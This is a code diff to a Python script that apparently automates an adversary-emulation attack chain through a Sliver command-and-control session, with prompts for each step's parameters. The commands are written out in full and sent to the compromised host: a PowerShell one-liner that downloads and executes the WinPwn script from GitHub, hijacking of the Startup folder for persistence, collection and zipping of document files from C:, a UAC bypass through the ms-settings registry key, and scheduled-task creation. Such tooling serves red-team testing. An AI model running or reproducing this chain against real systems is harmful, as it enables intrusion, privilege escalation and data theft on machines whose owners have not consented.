@@ -28,7 +28,7 @@ def confirm_action(prompt: str = "Keep going with the next attack step?") -> boo
 async def main():
     print_welcome_message()
     from attack_executor.config import load_config
-    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
+    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
     from attack_executor.post_exploit.Sliver import SliverExecutor
     sliver_executor = SliverExecutor(config=config)
     console.print("""\
@@ -135,20 +135,9 @@ async def main():
 
     user_params["SessionID"] = sliver_sessionid
 
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
     confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
-
-    confirm_action()
-    commands = """
-    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-    otherchecks -noninteractive -consoleoutput
+    commands = rf"""
+    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -185,10 +174,33 @@ async def main():
     confirm_action()
 
     confirm_action()
-    commands = """
-    New-Item -ItemType Directory -path "#{new_startup_folder}"
-    Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
-    Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 11 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: new_startup_folder[/]")
+    console.print(f"  Description: new startup folder to replace standard one")
+    default_val = "$env:TMP\atomictest"
+    user_input = console.input(
+        f"[bold]➤ Enter value for new_startup_folder [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: new_startup_folder")
+    user_params["new_startup_folder"] = user_input
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 11 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: payload[/]")
+    console.print(f"  Description: executable to be placed in new startup location ")
+    default_val = "C:\Windows\System32\calc.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for payload [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: payload")
+    user_params["payload"] = user_input
+    commands = rf"""
+    New-Item -ItemType Directory -path "{user_params["new_startup_folder"]}"
+    Copy-Item -path "{user_params["payload"]}" -destination "{user_params["new_startup_folder"]}"
+    Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "{user_params["new_startup_folder"]}"
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -218,37 +230,51 @@ async def main():
         raise
 
     confirm_action()
-    commands = """
-    Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_file[/]")
+    console.print(f"  Description: Location to save zipped file or folder")
+    default_val = "None"
+    user_input = console.input(
+        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: output_file")
+    user_params["output_file"] = user_input
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: input_file[/]")
+    console.print(f"  Description: Location of file or folder to zip")
+    default_val = "None"
+    user_input = console.input(
+        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: input_file")
+    user_params["input_file"] = user_input
+    commands = rf"""
+    Compress-Archive -Path "{user_params["input_file"]}" -DestinationPath {user_params["output_file"]} -Force
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
     print_finished_message()
 
     confirm_action()
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 15 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_zip_folder_path[/]")
+    console.print(f"  Description: Path to directory for saving the generated zip file")
+    default_val = "PathToAtomicsFolder\..\ExternalPayloads\T1005"
+    user_input = console.input(
+        f"[bold]➤ Enter value for output_zip_folder_path [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: output_zip_folder_path")
+    user_params["output_zip_folder_path"] = user_input
     commands = """
-    $startingDirectory = "C:"
-    $outputZip = "#{output_zip_folder_path}"
-    $fileExtensionsString = ".doc, .docx, .txt"
-    $fileExtensions = $fileExtensionsString -split ", "
-    New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
-    Function Search-Files {
-    param (
-    [string]$directory
-    )
-    $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
-    $fileExtensions -contains $_.Extension.ToLower()
-    }
-    return $files
-    }
-    $foundFiles = Search-Files -directory $startingDirectory
-    if ($foundFiles.Count -gt 0) {
-    $foundFilePaths = $foundFiles.FullName
-    Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
-    Write-Host "Zip file created: $outputZip\data.zip"
-    } else {
-    Write-Host "No files found with the specified extensions."
-    }
+    $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -305,6 +331,17 @@ async def main():
     confirm_action()
 
     confirm_action()
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 20 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: executable_binary[/]")
+    console.print(f"  Description: Binary to execute with UAC Bypass")
+    default_val = "C:\Windows\System32\cmd.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for executable_binary [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: executable_binary")
+    user_params["executable_binary"] = user_input
     commands = """
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
@@ -410,6 +447,28 @@ async def main():
     print_finished_message()
 
     confirm_action()
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 32 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: task_command[/]")
+    console.print(f"  Description: What you want to execute")
+    default_val = "C:\windows\system32\cmd.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for task_command [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: task_command")
+    user_params["task_command"] = user_input
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 32 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: time[/]")
+    console.print(f"  Description: What time 24 Hour")
+    default_val = "1210"
+    user_input = console.input(
+        f"[bold]➤ Enter value for time [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: time")
+    user_params["time"] = user_input
     commands = """
     SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
     """
@@ -419,25 +478,7 @@ async def main():
 
     user_params["SessionID"] = sliver_sessionid
 
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
-    confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
-
     user_params["SessionID"] = sliver_sessionid
-
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
-    confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
 
 
 if __name__ == "__main__":
